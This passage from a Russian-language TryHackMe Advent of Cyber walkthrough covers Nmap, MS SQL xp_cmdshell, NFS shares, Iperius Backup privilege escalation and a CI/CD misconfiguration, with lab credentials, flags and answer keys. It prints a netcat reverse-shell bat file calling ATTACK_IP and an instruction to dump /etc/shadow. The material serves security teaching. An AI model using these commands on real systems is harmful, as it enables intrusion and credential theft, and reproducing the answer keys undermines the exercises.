аналогию. Вы хотите заказать эспрессо в кофейне на вынос. Протокол для получения эспрессо может выглядеть следующим 
образом:  

- Клиент: Здравствуйте.
- Бариста: Привет.
- Клиент: Мне, пожалуйста, один эспрессо.
- Бариста: Это будет стоить 3 фунта стерлингов.
- Клиент: Вот, пожалуйста, 3 фунта стерлингов.
- Бариста: Спасибо. Ваш эспрессо готов.
- Клиент: Спасибо.


Поскольку я следую этому «протоколу», другие клиенты могут следовать немного иному «протоколу», основанному на 
культуре кофейни и страны. Некоторые могут пропустить «привет» в начале или опустить «спасибо» в конце. В 
человеческом мире это все равно будет работать; однако для компьютеров нам нужно принять строгий протокол, которого 
должны придерживаться и клиенты, и серверы. Вот почему у нас есть стандартные протоколы для компьютеров.

Вот несколько примеров протоколов TCP /IP:
- Протокол передачи гипертекста (HTTP) для обслуживания веб-страниц
- Система доменных имен (DNS) для преобразования имен хостов в IP-адреса
- Почтовый протокол версии 3 (POP3) для доставки электронной почты
- Простой протокол передачи почты (SMTP) для отправки электронной почты
- Telnet для удаленного входа
Secure Shell (SSH) для безопасного удаленного входа
Каждый из этих протоколов подробно описан в документе Request for Comment (RFC). Если вы хотите узнать больше об 
  этих протоколах, мы предлагаем присоединиться к комнате Protocols and Servers. 

### Порты
На хосте несколько процессов (программ) могут одновременно получать доступ к сети. Эти процессы могут использовать 
сеть одновременно. Чтобы хост мог сказать, какой процесс получает какой пакет, нам нужно использовать номера портов. 
Чтобы лучше понять концепцию IP-адресов и номеров портов, давайте рассмотрим следующую аналогию.

Давайте представим себе компанию TryHackMe в Лондоне, и представим, что там есть 100 офисов для 100 
контент-инженеров. Адрес компании подобен публичному IP-адресу. С адресом компании почтальон (аналог маршрутизатора) 
знает, как связаться с компанией и доставить почтовые посылки. Номер порта подобен номеру офиса внутри компании. 
Почтальон может доставить почту на адрес компании и передать ее секретарю; однако сотрудник TryHackMe доставит 
посылку во внутренний офис.

Когда несколько процессов одновременно используют сеть или Интернет, каждый процесс можно распознать по номеру порта,
который он использует. На публичных серверах номера портов по умолчанию используются различными протоколами, чтобы 
клиентам не приходилось угадывать. В таблице ниже показаны некоторые распространенные протоколы и номера портов, 
которые они используют по умолчанию.

```commandline
Протокол	Номер порта
HTTP	80
HTTPS	443
POP3	110
SMTP	25
SSH	22
Телнет	23
```

Рассмотрим рисунок ниже. IP-пакеты, поступающие на сервер с IP-адресом,  10.10.13.13 будут доставлены запущенному 
процессу на основе номера порта назначения. 

Для пакетов типа TCP с номером порта 22 процессом назначения является SSH- сервер.
Для пакетов типа TCP с номером порта 80 процессом назначения является HTTP- сервер.
Для пакетов типа UDP (или TCP ) с номером порта 53 процессом назначения является DNS -сервер.


Мы не будем подробно рассматривать TCP и UDP в этой задаче. Все, что вам нужно знать на данный момент, это то, что 
эти два протокола работают поверх протокола IP и  соединяют процессы, запущенные на разных хостах. Более того, TCP 
требует трехстороннего рукопожатия для установления соединения, в то время как UDP этого не требует.

### Nmap
McSkidy хочет узнать, что злоумышленник узнал о ее хостах и серверах. Она запускает AttackBox и подключенную 
виртуальную машину (VM), и ждет, пока обе полностью загрузятся. 

Она хочет проверить, какие службы она установила на VM. На AttackBox она открывает терминал и спешит запустить 
сканирование Nmap на VM. McSkidy может запустить очень простое сканирование сетевых портов с помощью команды  nmap 
-sT MACHINE_IP или  nmap -sS MACHINE_IP. По умолчанию Nmap проверяет 1000 наиболее распространенных портов TCP.

TCP Connect Scan: Для запуска этого типа сканирования -sT требуется опция. Nmap попытается выполнить трехстороннее 
рукопожатие, чтобы установить соединение с каждым сканируемым портом. 
TCP SYN Scan: Вы можете выбрать это сканирование с помощью опции  -sS, и Nmap не будет устанавливать полное 
соединение, если порт открыт. Технически говоря, Nmap не завершает трехстороннее рукопожатие TCP. 
Чтобы лучше понять разницу между -sT и -sS, можно использовать аналогию со стуком в дверь. Сканирование 
TCP-соединения (-sT) похоже на стук в дверь, ожидание, пока кто-то откроет, приветствие друг друга, затем извинение,
чтобы уйти. Сканирование TCP SYN (-sS) напоминает стук, и как только кто-то отвечает, вы делаете вид, что это не вы 
стучали, и невинно уходите. Последнее затруднит для другой стороны запомнить вас.

### Ответить на вопросы ниже
Помогите McSkidy и запустите nmap -sT MACHINE_IP. Сколько портов открыто между 1 и 100?
```commandline
2
```
Какой наименьший номер открытого порта?
```commandline
22
```
Какая служба связана с самым большим номером порта, который вы нашли в первом вопросе?
```commandline
HTTP
```
Теперь беги nmap -sS MACHINE_IP. Получили ли вы те же результаты? (Т/И)
```commandline
Y
```
Если вы хотите, чтобы Nmap определил версию установленных служб, вы можете использовать  nmap -sV MACHINE_IP. Каков 
номер версии веб-сервера? 
```commandline
Apache httpd 2.4.49
```
Проверяя уязвимости, связанные с установленным веб-сервером , вы узнаете, что существует критическая уязвимость, 
которая позволяет обход пути и удаленное выполнение кода. Теперь вы можете сказать McSkidy, что Grinch Enterprises 
использовала эту уязвимость. Каков номер CVE уязвимости, которая была устранена в версии 2.4.51?
```commandline
CVE-2021-42013
```
Вы собираете все воедино и имеете хорошее представление о том, как был взломан ваш веб-сервер. МакСкиди подозревает, 
что злоумышленник мог установить бэкдор. Она просит вас проверить, есть ли какая-либо служба, прослушивающая 
необычный порт, т. е. за пределами 1000 обычных портов, которые Nmap сканирует по умолчанию. Она объясняет, что 
добавление  -p1-65535 или  -p- будет сканировать все 65 535 портов TCP вместо сканирования только 1000 самых 
распространенных портов. Какой номер порта появился в результатах сейчас?
```commandline
20212
```
Как называется программа, прослушивающая недавно обнаруженный порт?
```commandline
telnetd
```
Если вы хотите узнать больше о темах, затронутых в сегодняшних заданиях, рекомендуем ознакомиться с  модулем 
«Сетевая безопасность».
```commandline
Ответ не нужен
```
## Задание 16
Посмотрите видео-обучение Tib3rius на 11-й день здесь

Прежде чем начать, мы предлагаем вам запустить прилагаемые Machine и AttackBox, поскольку эти ресурсы вам 
понадобятся для ответа на вопросы в конце. 

McDatabaseAdmin вбежал в комнату и крикнул McSkidy: «Нас заблокировали из расписания оленей — как будет работать 
транспорт Санты на Рождество?» Гринч заблокировал McDatabaseAdmin в своей системе. Вам нужно проверить внешнюю 
поверхность сервера, чтобы увидеть, сможете ли вы вернуть ему доступ.  

MS SQL Server — это система управления реляционными базами данных (RDBMS). Один из простых способов представить себе 
реляционную базу данных — это группа таблиц, имеющих связи. Чтобы получить общее представление о работе реляционных 
баз данных, рассмотрим базу данных магазина со следующими тремя таблицами:  

Наконец, таблица Invoices будет ссылаться на клиента и один или несколько электронных элементов. Таблица Invoice 
будет ссылаться на «сущность» из другой таблицы, используя ее идентификатор. Таким образом, нам нужно будет записать 
данные клиента и данные электронного элемента только один раз, а не копировать их в каждый новый счет. Этот случай 
является упрощенным примером реляционной базы данных. На рисунке ниже показано, как связаны три таблицы.   

Расписание транспортировки находится в базе данных оленей. Однако McDatabaseAdmin больше не может войти в свою 
систему после того, как Гринч сменил системный пароль. Давайте посмотрим, как мы можем помочь. Убедитесь, что вы 
запустили подключенную Машину вместе с AttackBox. Дайте им несколько минут, чтобы полностью запуститься, прежде чем 
продолжить отвечать на следующие вопросы.

### Ответить на вопросы ниже
Вы решили, что первым шагом будет проверка запущенных служб на MACHINE_IP. Вы прибегаете к вчерашнему инструменту Nmap.

Зная, что MACHINE_IP это система MS Windows, вы ожидаете, что она не будет отвечать на ping-запросы по умолчанию; 
поэтому вам нужно добавить -Pn к вашей nmap команде для выполнения сканирования. Это предписывает Nmap пропустить 
ping-запрос цели, чтобы проверить, доступен ли хост. Без этой опции Nmap будет считать, что целевой хост находится в 
автономном режиме, и не продолжит сканирование.

Есть открытый порт, связанный с MS SQL Server, доступный по сети. Какой номер порта?
```commandline
1433
```
Зная, что MS SQL Server запущен и доступен по сети, мы хотим проверить, действительны ли еще наше имя пользователя и 
пароль. Используя терминал AttackBox, мы будем использовать команду sqsh (произносится как skwish), интерактивную 
оболочку базы данных.  

Простой синтаксис будет  sqsh -S server -U username -P password таким:
- -S server используется для указания сервера, например -S MACHINE_IP
- -U username используется для предоставления имени пользователя; например,  -U sa — это имя пользователя, которое мы 
  включили.
- -P password позволяет нам указать пароль.
Давайте попробуем бежать, `sqsh -S MACHINE_IP -U sa -P t7uLKzddQzVjVFJp`

Если подключение прошло успешно, вы получите подсказку. Какую подсказку вы получили?
```commandline
1>
```

McDatabaseAdmin сообщил нам, что имя базы данных следующее, reindeer и в ней есть три таблицы:
names
presents
schedule
Для отображения таблицы  names можно использовать следующий синтаксис:  `SELECT * FROM table_name WHERE condition`.

SELECT * используется для возврата определенных столбцов (атрибутов).  * относится ко всем столбцам.
FROM table_name чтобы указать таблицу, из которой вы хотите прочитать данные.
WHERE condition для указания строк (сущностей).
В терминале ниже мы выполнили запрос, SELECT * FROM reindeer.dbo.names;. Этот SQL-запрос должен выгрузить все 
содержимое таблицы names из базы данных reindeer. Обратите внимание, что; указывает на конец SQL-запроса, а  go 
отправляет SQL-пакет в базу данных.  

Терминал пентестера
```commandline
pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P "t7uLKzddQzVjVFJp"
1> SELECT * FROM reindeer.dbo.names;
2> go
 id          first                                    last                                     nickname
 ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------
           1 Dasher                                   Dasher                                   Dasher                                  
           2 Dancer                                   Dancer                                   Dancer                                  
           3 Prancer                                  Prancer                                  Prancer                                 
           4 Vixen                                    Vixen                                    Vixen                                   
           5 Comet                                    Comet                                    Comet                                   
           6 Cupid                                    Cupid                                    Cupid                                   
           7 Donner                                   Donder                                   Dunder                                  
           8 Blitzen                                  Blixem                                   Blitzen                                 
           9 Rudolph                                  Reindeer                                 Red Nosed

 (9 rows affected)
```
Мы видим четыре столбца в таблице, показанной выше: id, first (name), last (name) и nickname. Каково имя оленя id 9?
```commandline
Rudolph
```
Проверьте таблицу schedule. Каков пункт назначения поездки, запланированной на 7 декабря?
```commandline
Prague
```
Проверьте таблицу  presents. Какое количество доступно для настоящего «Power Bank»?
```commandline
25000
```
Вы проделали фантастическую работу! Вы помогли McDatabaseAdmin получить расписание! Теперь давайте посмотрим, сможем 
ли мы запускать команды MS Windows во время взаимодействия с базой данных. Некоторые серверы MS SQL включены  
xp_cmdshell . Если это так, то у нас может быть доступ к чему-то похожему на командную строку.  

Синтаксис команды —  xp_cmdshell 'COMMAND';. Давайте попробуем простую команду,  whoami, которая показывает 
пользователя, выполняющего команды. В выводе терминала ниже, после подключения к MS SQL Server, мы попробовали  
xp_cmdshell 'whoami';, и мы видим, что пользователь —  nt service\mssqlserver. Это означает, что любая команда, 
которую мы передадим,  xp_cmdshell будет запущена как  nt service\mssqlserver.   

Терминал пентестера
```commandline
pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P "t7uLKzddQzVjVFJp"
1> xp_cmdshell 'whoami';
2> go

	output

[...]

	nt service\mssqlserver
    
	NULL
    
(2 rows affected, return status = 0)
```
Мы можем запускать другие команды, которые мы можем выполнять в командной строке MS Windows. Например, мы можем 
использовать dir для перечисления файлов и каталогов и  type filename для отображения содержимого файла. Рассмотрим 
пример в окне терминала ниже, где мы показываем содержимое текстового файла WindowsUpdate.log.

Терминал пентестера
```commandline
pentester@TryHackMe$ sqsh -S MACHINE_IP -U sa -P "t7uLKzddQzVjVFJp"
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> xp_cmdshell 'type c:\windows\WindowsUpdate.log';
2> go

	output
	
[...]
        
        Windows Update logs are now generated using ETW (Event Tracing for Windows).
	Please run the Get-WindowsUpdateLog PowerShell command to convert ETW traces into a readable WindowsUpdate.log.

	NULL
	
	NULL
	
	For more information, please visit https://go.microsoft.com/fwlink/?LinkId=518345 
(5 rows affected, return status = 0)
1>
```
В домашнем каталоге пользователя спрятан флаг grinch. Каково его содержимое?
```commandline
THM{YjtKeUy2qT3v5dDH}
```
Поздравляем, восстановленный вами флаг содержит пароль McDatabaseAdmin! В этой задаче мы узнали, как использовать  
sqsh для взаимодействия с MS SQL Server. Мы узнали, что если xp_cmdshell включено, мы можем выполнять системные 
команды и читать вывод с помощью sqsh.
```commandline
Ответ не нужен
```

## Задание 17
Посмотрите видео-обучение Нила Бриджеса на 12-й день здесь

Прежде чем начать, мы предлагаем вам запустить прилагаемые Machine и AttackBox, поскольку эти ресурсы вам 
понадобятся для ответа на вопросы в конце. 

Grinch Enterprises оставляет следы того, как их хакеры получают доступ к данным из системы - вы нашли уникальный 
сервер, который они используют. Нам нужна ваша помощь, чтобы выяснить, какой метод они использовали для извлечения 
данных.  

Мы заметили, что это  MACHINE_IP генерирует необычный трафик. Мы очень подозреваем, что Grinch Enterprises 
использует его для доступа к нашим данным. Мы воспользуемся Nmap, чтобы обнаружить, какие службы работают на их 
сервере.  

### Ответить на вопросы ниже
Просканируйте целевой сервер с IP  MACHINE_IP. Помните, что хосты MS Windows блокируют пинги по умолчанию, поэтому 
нам нужно добавить  -Pn, например,  nmap -Pn MACHINE_IP для корректной работы сканирования. Сколько портов TCP открыто? 
```commandline
7
```
Network File System (NFS) — это протокол, который позволяет передавать файлы между различными компьютерами и 
доступен во многих системах, включая MS Windows и Linux. Следовательно, NFS упрощает обмен файлами между различными 
операционными системами.  

В результатах сканирования, которые вы получили ранее, вы должны были обнаружить NFS или mountd, в зависимости от 
того, использовали ли вы опцию  -sV с Nmap или нет. Какой порт определяется Nmap как NFS или с использованием службы 
mountd?  
```commandline
2049
```
Теперь, когда мы обнаружили, что служба NFS прослушивается, давайте проверим, какие файлы являются общими. Мы можем 
сделать это с помощью команды showmount. В терминале ниже мы запускаем showmount -e MACHINE_IP. -eИли 
--exportsпоказываем список экспорта сервера NFS.  

Терминал пентестера
```commandline
pentester@TryHackMe$ showmount -e MACHINE_IP
Export list for MACHINE_IP:
/share        (everyone)
/my-notes     (noone)
```
Как мы видим в выводе терминала выше, у нас есть два общих ресурса, /shareи /my-notes. После запуска подключенной 
машины используйте терминал AttackBox для обнаружения общих ресурсов на MACHINE_IP. 

Сколько акций вы нашли?
```commandline
4
```
Сколько акций показывают «всех»?
```commandline
3
```
Давайте попробуем смонтировать обнаруженные нами общие ресурсы. Мы можем создать каталог на AttackBox с помощью 
mkdir tmp1, где tmp1— имя каталога. Затем мы можем использовать этот каталог, который мы создали, для монтирования 
публичного общего ресурса NFS с помощью:  mount MACHINE_IP:/my-notes tmp1.  

Терминал пентестера
```commandline
pentester@TryHackMe$ mount MACHINE_IP:/my-notes tmp1
mount.nfs: access denied by server while mounting MACHINE_IP:/my-notes
```
Мы видим, что монтирование не удалось. my-notesне является общедоступным и требует определенных механизмов 
аутентификации, к которым у нас нет доступа. Давайте попробуем еще раз с другой папкой, share. 

Терминал пентестера
```commandline
pentester@TryHackMe$ mount MACHINE_IP:/share tmp1
```

Мы не получили никаких сообщений об ошибках, так что это был успех. Давайте зайдем внутрь общего ресурса, чтобы 
посмотреть, что внутри него, используя cd tmp1, затем ls. 

Терминал пентестера
```commandline
pentester@TryHackMe$ ls
132-0.txt  2680-0.txt
```
Есть два текстовых файла. Мы можем открыть файл с помощью любого текстового редактора, например, nano FILENAMEили 
чего-то более быстрого, например less FILENAME,. 

Каково название файла 2680-0.txt?
```commandline
Meditations
```
Похоже, что Grinch Enterprises забыли свои ключи SSH в нашей системе. Одна из акций содержит закрытый ключ, 
используемый для аутентификации SSH ( id_rsa). Как называется эта акция? 
```commandline
confidential
```
Мы можем вычислить сумму MD5 файла, используя  md5sum FILENAME. Какова сумма MD5  id_rsa?
```commandline
3e2d315a38f377f304f5598dc2f044de
```

## Задание 18
История

McSkidy поняла, что она работала над черновиком плана аварийного восстановления, но заблокировала разрешения на файл,
чтобы обеспечить его безопасность. Однако Гринч получил доступ к локальной системе и снизил разрешения ее учетной 
записи. Можно ли повысить ее привилегии и вернуть файл?  



### Цели обучения
- Понимание различных типов привилегий пользователей в Windows
- Различные методы повышения привилегий
- Эксплуатация уязвимости повышения привилегий
- Посмотрите видео-обучение HuskyHacks на 13-й день  здесь
Прежде чем начать, пожалуйста, запустите целевую машину. Вы можете использовать доступ в браузере или подключиться к 
  ней через RDP , используя учетные данные ниже.


Имя пользователя:  mcskidy

Пароль:  Пароль1

### Привилегии

McSkidy принял правильное решение; жизнь любого злонамеренного хакера становится проще, если он подключается к 
системе с привилегированными учетными записями. Привилегированная учетная запись (например, Administrator в системах 
Windows или Root в системах Linux ) позволит ему получить доступ к любому файлу в системе и внести любые необходимые 
изменения. Учетная запись с более низкими привилегиями может все усложнить.



Гринч неплохо разбирается в кибербезопасности. Ограничение привилегий учетной записи МакСкиди усложняет процесс 
реагирования на инциденты. Возможно, ей придется запустить инструменты или удалить любую вредоносную учетную запись, 
которую Гринч мог создать, но учетная запись с ограниченными привилегиями сделает это невозможным.



На типичном сервере Windows вы можете найти несколько различных типов учетных записей; они перечислены ниже.
- Администраторы домена: Обычно это самый высокий уровень учетной записи, который вы найдете в организации вместе с 
администраторами предприятия. Учетная запись с этим уровнем привилегий может управлять всеми учетными записями 
  организации, их уровнями доступа и почти всем, что вы можете себе представить. «Домен» — это центральный реестр, 
  используемый для управления всеми пользователями и компьютерами в организации.  
- Службы: учетные записи, используемые программным обеспечением для выполнения своих задач, таких как резервное 
  копирование или антивирусное сканирование.
- Пользователи домена: учетные записи, которые обычно используются сотрудниками. Они должны иметь достаточно прав для 
  выполнения своей повседневной работы. Например, системный администратор может ограничить возможность пользователя устанавливать и удалять программное обеспечение.
- Локальные учетные записи: эти учетные записи действительны только в локальной системе и не могут использоваться в 
  домене.
Учетные записи можно легко управлять с помощью групп. Например, учетную запись McSkidy можно создать как обычного 
  пользователя и позже добавить в группу администраторов домена, предоставив ей привилегии администратора домена. 

### Векторы повышения привилегий Windows

Ниже перечислены несколько распространенных векторов, которые могут позволить любому пользователю повысить уровень 
своих привилегий в системе Windows.
- Сохраненные учетные данные: важные учетные данные могут быть сохранены пользователем в файлах или в файле 
конфигурации приложения, установленного в целевой системе.
- Уязвимость ядра Windows: операционная система Windows, установленная на целевой системе, может иметь известную 
  уязвимость, которую можно использовать для повышения уровня привилегий.
- Небезопасные права доступа к файлам/папкам: в некоторых ситуациях даже пользователь с низкими привилегиями может 
  иметь права на чтение или запись файлов и папок, которые могут содержать конфиденциальную информацию.
- Небезопасные разрешения на доступ к службам: Подобно разрешениям на доступ к конфиденциальным файлам и папкам, 
  пользователи с низкими привилегиями могут иметь права на доступ к службам. Они могут быть довольно безобидными, 
  например, запрос статуса службы (SERVICE_QUERY_STATUS), или более интересными правами, например, запуск и 
  остановка службы (SERVICE_START и SERVICE_STOP соответственно).
- Перехват DLL: приложения используют файлы DLL для поддержки своего выполнения. Вы можете думать о них как о меньших 
  приложениях, которые могут быть запущены основным приложением. Иногда DLL, которые удалены или отсутствуют в 
  системе, вызываются приложением. Эта ошибка не всегда приводит к сбою приложения, и приложение все равно может 
  работать. Нахождение DLL, которую ищет приложение, в месте, куда мы можем записать, может помочь нам создать 
  вредоносный файл DLL, который будет запущен приложением. В таком случае вредоносный DLL будет запущен с уровнем 
  привилегий основного приложения. Если приложение имеет более высокий уровень привилегий, чем наш текущий 
  пользователь, это может позволить нам запустить оболочку с более высоким уровнем привилегий.
Путь к службе без кавычек: если путь к исполняемому файлу службы содержит пробел и не заключен в кавычки, хакер 
  может внедрить собственные вредоносные исполняемые файлы для запуска вместо предполагаемого исполняемого файла.
Always Install Elevated: приложения Windows можно устанавливать с помощью файлов установщика Windows (также 
  известных как пакеты MSI). Эти файлы делают процесс установки простым и понятным. Системы Windows можно настроить 
  с помощью политики «AlwaysInstallElevated». Это позволяет процессу установки запускаться с правами администратора, 
  не требуя от пользователя наличия этих прав. Эта функция позволяет пользователям устанавливать программное 
  обеспечение, которому могут потребоваться более высокие права, не имея этого уровня привилегий. Если настроено 
  «AlwaysInstallElevated», вредоносный исполняемый файл, упакованный как файл MSI, может быть запущен для получения 
  более высокого уровня привилегий.
Другое программное обеспечение: программное обеспечение, приложения или скрипты, установленные на целевой машине, 
  также могут предоставлять векторы повышения привилегий. 
В идеале McSkidy должен изучить все это. Повышение привилегий не имеет универсального решения, и вектор, который 
  сработает, зависит не только от конфигурации целевой системы, но и, в некоторых случаях, от поведения пользователя 
  (например, нахождение файла passwords.txt на рабочем столе, где пользователь записывает пароли своих учетных 
  записей). В некоторых случаях вам нужно будет объединить два или более векторов, чтобы достичь желаемого результата.

### Первоначальный сбор информации

Сбор информации является важным шагом в эскалации привилегий, поскольку именно так вы можете раскрыть потенциальные 
векторы. Некоторые автоматизированные скрипты доступны для быстрого перечисления большинства известных векторов, 
перечисленных выше. Однако в реальных заданиях по тестированию на проникновение вам часто придется проводить 
дополнительные исследования на основе результатов этих скриптов.

Вот несколько ключевых моментов перечисления:
- Пользователи в целевой системе.  net users Команда выведет список пользователей в целевой системе.
- Версия  ОС systeminfo | findstr /B /C: "OS Name"/C: "OS Version" :  Команда выведет информацию об операционной 
  системе. Это следует использовать для дальнейшего исследования того, существует ли уязвимость повышения привилегий 
  для этой версии.  
- Установленные службы:  wmic service list команда выведет список служб, установленных в целевой системе.
- В реальном бою вам следует следовать более обширному списку команд, представленному в нашей комнате повышения 
  привилегий Windows. 

### Эксплуатация
Служба резервного копирования Iperius страдает от уязвимости повышения привилегий. Макскиди может использовать ее 
для повышения своих привилегий в системе. Когда Iperius Backup устанавливается как служба, ее можно настроить для 
запуска задач резервного копирования с привилегиями администратора, даже если текущий пользователь имеет более 
низкий уровень привилегий.


Давайте рассмотрим этапы эксплуатации:
1) Создайте новую задачу резервного копирования: сама задача не важна. Вы можете указать путь резервного копирования 
   как C:\Users\McSkidy\Documents 
2) Задайте место назначения: На вкладке назначения вы можете задать место, куда будет записана резервная копия. 
   Опять же, это не важно; вы можете задать C:\Users\McSkidy\Desktop 
3) Другие процессы: Вкладка «другие процессы» важна. Как видите, она дает нам возможность задать программу для 
   запуска до или после каждого процесса резервного копирования. Поскольку процесс резервного копирования 
   выполняется с правами администратора, любая программа или внешний файл, настроенный здесь, будет запущен с 
   правами администратора. Чтобы воспользоваться этим, мы создадим простой bat-файл и настроим его на запуск перед 
   резервным копированием.    
Файл .bat запустит оболочку с помощью утилиты nc.exe (удобно расположенной в C:\Users\McSkidy\Downloads\nc.exe). 
   Запустите текстовый редактор Notepad и введите следующие строки кода. 
```commandline
@echo off

C:\Users\McSkidy\Downloads\nc.exe ATTACK_IP 1337 -e cmd.exe
```

Вам нужно будет заменить «ATTACK_IP» на IP-адрес вашей атакующей машины; мы рекомендуем запустить AttackBox (синяя 
кнопка в верхней части этой страницы). 
Вы можете сохранить файл как evil.bat на рабочем столе целевой системы (MACHINE_IP) и выбрать его, включив опцию 
«запустить программу или открыть внешний файл». Нажмите OK, и вы должны увидеть задание резервного копирования с 
именем «documents» на панели управления Iperius.  
4) Запуск прослушивателя: Файл evil.bat запустит cmd.exe и подключится к нашей атакующей машине на порт 1337. У нас 
   должен быть прослушиватель, готовый принять это входящее соединение. Вы можете запустить  ncна своей атакующей 
   машине с помощью  nc -nlvp 1337 команды.  
5) Запустить как службу: Щелкните правой кнопкой мыши по ранее созданному заданию резервного копирования «документ» 
   и выберите параметр «Запустить резервное копирование как службу». 
6) Счастливого Рождества! Примерно через минуту вы увидите входящее соединение на вашей атаке



### Дальнейшее чтение

Повышение привилегий — важная тема для тестов на проникновение и различных экзаменов на получение профессиональных 
сертификатов. Вы можете посетить комнаты ниже, чтобы узнать больше о различных методах, используемых для повышения 
привилегий:  
- Повышение привилегий Windows
- Повышение привилегий Linux

### Ответить на вопросы ниже
Введите имя пользователя: p.....
```commandline
pepper
```
Какая версия ОС?
```commandline
10.0.17763 N/A Build 17763
```
Какую службу резервного копирования вы обнаружили работающей в системе?
```commandline
IperiusSvc
```
Каков путь к исполняемому файлу для определенной вами службы резервного копирования?
```commandline
C:\Program Files (x86)\Iperius Backup\IperiusService.exe
```
Запустите команду whoami на подключении, которое вы получили на атакующей машине. Какой у вас пользователь?
```commandline
the-grinch-hack\thegrinch
```
Каково содержимое файла flag.txt?
```commandline
THM-736635221
```
Гринч забыл удалить файл, в котором он вел записи о своем расписании! Где мы можем найти его в 5:30?
```commandline
jazzercize
```

## Задание 19
### История

McDev — глава команды разработчиков, отправляет тревожное письмо, в котором говорится, что они не могут обновить 
внешнее веб-приложение лучшей фестивальной компании. Без этого обновления никто не сможет просмотреть план лучшей 
фестивальной компании. Команда разработчиков использовала сервер CI /CD для автоматической отправки обновлений на 
сервер, но сервер CI / CD был скомпрометирован. Можете ли вы помочь им вернуть свой сервер?   

### Цели обучения
- Понимание концепции CI / CD
- Обзор рисков, связанных с CI / CD
- Иметь базовые знания о векторах эксплуатации CI / CD


Посмотрите видео-обучение Дэвина на 14-й день здесь
### Что такое CI / CD ?
CI / CD — это два термина, которые часто встречаются при обсуждении разработки программного обеспечения и DevOps. 
Их определения довольно просты. 
CI : Continuous Integration — это процесс, в котором исходный код программного обеспечения хранится в центральном 
репозитории (например, GitHub). Все изменения хранятся в этом центральном репозитории, чтобы избежать попадания в 
разные версии одного и того же кода.  
CD: Continuous Delivery — это следующий (иногда неотъемлемый) шаг модели непрерывной интеграции, при котором код 
автоматически развертывается в тестовой, предпроизводственной или производственной среде. CD иногда используется как 
аббревиатура от «Continuous Deployment». Если вам кажется, что приведенные выше термины не имеют четких границ, вы 
правы. CI , CD и другие CD являются частью лучших практик DevOps , которые направлены на то, чтобы сделать доставку 
кода более быстрой и надежной.    

CI / CD следует рассматривать как набор практик, которые внедряются, чтобы позволить командам разработчиков вносить 
изменения, тестировать свой код и развертывать приложение более надежно. 

Мы должны рассматривать CI / CD как непрерывный процесс или цикл, включающий этапы процесса разработки программного 
обеспечения. 

### Риски, связанные с CI / CD
Подход к интеграции CI /CD представляется эффективным способом снижения рисков, которые могут возникнуть в 
результате ручного объединения изменений, внесенных в код, ручного их тестирования и ручного развертывания 
обновленной версии приложения. Однако при работе с такой интеграцией следует учитывать некоторые риски, связанные с 
процессом CI /CD. Как тестировщик на проникновение, одной из наших целей будет выявление слабых мест в процессе 
автоматизации. Они могут варьироваться от прав доступа к файлам до ошибок конфигурации, допущенных при установке 
любого программного обеспечения для автоматизации CI /CD. Команды DevOps обычно используют такое программное 
обеспечение, как Jenkins, GitLab, Bamboo, AWS CodePipeline и т. д., для автоматизациишагов CI / CD

, обобщенных выше. Основные риски, связанные с интеграцией CI / CD, указаны ниже:
- Безопасность доступа: Растущее число точек интеграции может затруднить управление доступом. Любой компонент, 
  интегрированный в процесс, может потребовать частичного или полного доступа к другому компоненту. В этом случае 
  предоставление слишком большого доступа также может открыть путь для вредоносной деятельности.  
- Разрешения: Компоненты связаны друг с другом и выполняют свои задачи с учетными записями пользователей. Подобно 
  безопасности доступа, разрешения пользователей должны быть проверены.
- Ключи и секреты: Многие интеграции выполняются с использованием ключей ( ключей API , ключей ID и т. д.) или 
  секретов. Они должны быть защищены. В противном случае любой может потенциально получить доступ к ресурсам, 
  используя этот метод аутентификации. 
- Безопасность пользователя: учетные записи пользователей являются еще одним успешным вектором атак, часто 
  используемым киберпреступниками. Любой пользователь, имеющий доступ к репозиторию исходного кода, может включить 
  вредоносный компонент в кодовую базу и может быть включен в развернутое приложение. 
- Конфигурация по умолчанию: Известно, что некоторые платформы имеют учетные данные по умолчанию и уязвимости. Если 
  учетные данные по умолчанию не изменены и используются в процессе CI / CD , это может привести к полной 
  компрометации инфраструктуры. 
### Grinch CI / CD
Гринч внедрил собственную версию конвейера CI/CD. Он использовал скрипты BASH и запланированные задания для 
автоматизации процесса. Давайте углубимся. 

Посетив MACHINE_IP из вашего браузера, вы увидите, что Гринч ждет добычу, но не здесь.

На этом этапе мы можем запустить dirb сканирование, чтобы обнаружить страницу MACHINE_IP/admin, которая выглядит 
более многообещающе. 

Глядя на исходный код, мы видим кое-что интересное. Есть iFrame, который ссылается на ls.html страницу. Эта страница 
кажется подозрительно близкой к выводу от запуска ls команды.

Подключитесь к целевой машине, используя доступ в браузере или с помощью SSH учетных данных ниже:
имя пользователя: mcskidy
пароль: Password1

Переход к `/home/thegrinch/scripts` папке и запуск ls команды покажет, что большинство скриптов в папке недоступны 
пользователю McSkidy. 
Содержимое скрипта loot.sh дает нам более четкое представление о ls.html файле, который мы нашли ранее.

Код прост; он запускает ls команду и выводит вывод в файл ls.html. Гринч может просматривать страницу из любой точки 
сети, чтобы увидеть добычу, которую он накопил. 
Умный Гринч. Однако, похоже, есть проблема с разрешениями его попытки непрерывной интеграции. МакСкиди может 
изменить содержимое файла loot.sh. 

Измените код в файле, чтобы распечатать содержимое файла `/etc/shadow`. Это будет убедительным доказательством того, 
что эта неправильная конфигурация разрешений не только создает угрозу для процесса CI, но и может быть использована 
для повышения наших привилегий. Если вам интересно узнать больше о методах повышения привилегий, посетите 
нашукомнату повышения привилегий Linux   

. Эта неправильная конфигурация может быть использована для чтения содержимого других скриптов Гринча.
Давайте посмотрим на check.sh скрипт, использующий уязвимость, которую мы использовали для чтения `/etc/shadow` файла.

Через пару минут страница MACHINE_IP/admin будет обновлена, чтобы показать код скрипта check.sh.

Этот скрипт проверяет наличие файла с указанным именем remindme.txt в папке добычи. Если файл найден, он печатает 
пароль Гринча в HTML-файл, который появится в MACHINE_IP/pass.html 

Память Гринча уже не та, что была раньше.

В качестве альтернативы McSkidy может создать файл с именем remindme.txt в `/home/thegrinch/loot` папке и подождать, 
пока автоматизация сотворит свое волшебство. 
Можете ли вы ответить на вопрос 4, используя этот вектор?

### Извлеченные уроки
Эта симуляция CI /CD была направлена на то, чтобы помочь продемонстрировать основные типы уязвимостей, которые 
